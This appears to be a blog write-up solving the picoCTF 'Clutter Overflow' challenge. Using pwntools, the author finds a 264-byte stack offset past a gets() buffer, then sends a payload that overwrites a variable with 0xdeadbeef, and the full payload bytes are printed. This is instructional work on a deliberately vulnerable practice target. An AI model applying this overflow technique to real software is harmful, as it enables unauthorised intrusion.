---
slug: clutter_overflow
title: Clutter Overflow
authors: [nguyen]
tags: [CTF, Binary Exploitation, Pico CTF]
---

Pico CTF: Clutter Overflow

<!--truncate-->

The challenge can be found [here](https://play.picoctf.org/practice/challenge/1216)

## The Challenge

Upon running `nc mars.picoctf.net 31890`, I get the following output.

![Clutter Overflow Startup](/img/clutter_overflow_start.png)

## The Solve

### Determining the objective

First, I attempt to send the input of 'monkeys' and receive this as output.

![Clutter Overflow Initial Output](/img/clutter_overflow_ex_output.png)

I take a look at the source as it is provided and see that the gets command is used to store the user input into the char buffer called 'clutter'. 'clutter' is a fixed size char array of length 100 and is vulnerable to buffer overruns.

![Clutter Overflow Source Code](/img/clutter_overflow_source.png)

In order to get the flag, I know that I need to overrun the buffer and modify the data stored within 'code' to be equal to 0xdeadbeef.

### Reaching the objective

I use python to create a script that establishes a connection to the challenge with the help of pwntools.

```python
io = remote('mars.picoctf.net', 31890)
```

I know that I need to send data that is significantly larger then the size of clutter's size. I use pwntools to create a pattern with length 500 and a unique subsequence of 8 bytes because the variable 'code' is 8 bytes.

```python
pat = cyclic(500, n=8)
```

I send the pattern to the server and receive up to before 'code' is printed.

```python
io.sendlineafter(b"What do you see?", pat)
```

I receive until the line that gives me the hex value of 'code' and convert it into an integer.

```python
io.recvuntil(b'code == 0x')
```

```python
code = io.recvline()
ints = int(code.decode(), base=16)
```

I print the value of ints and get '7089054359331365225' as the value.

I search for this as the sebsequence of cyclic_find and store it in 'offset'.

```python
offset = cyclic_find(ints, 8)
```

The value of offset turns out to be 264 so 'code' is 264 bytes away from 'clutter' on the stack. Knowing this, I can now send the value 0xdeadbeef after the offset using the fit command.

```python
payload = fit({
    offset:0xdeadbeef
})
```

The payload ends up as b'aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaabzaacbaaccaacdaaceaacfaacgaachaaciaacjaackaaclaacmaacnaacoaacpaac\xef\xbe\xad\xde\x00\x00\x00\x00'

I then send the payload to the server.

```python
io.sendlineafter(b"What do you see?", payload)
```

The output matches as expected and I get the flag.

![Clutter Overflow Flag](/img/clutter_overflow_flag.png)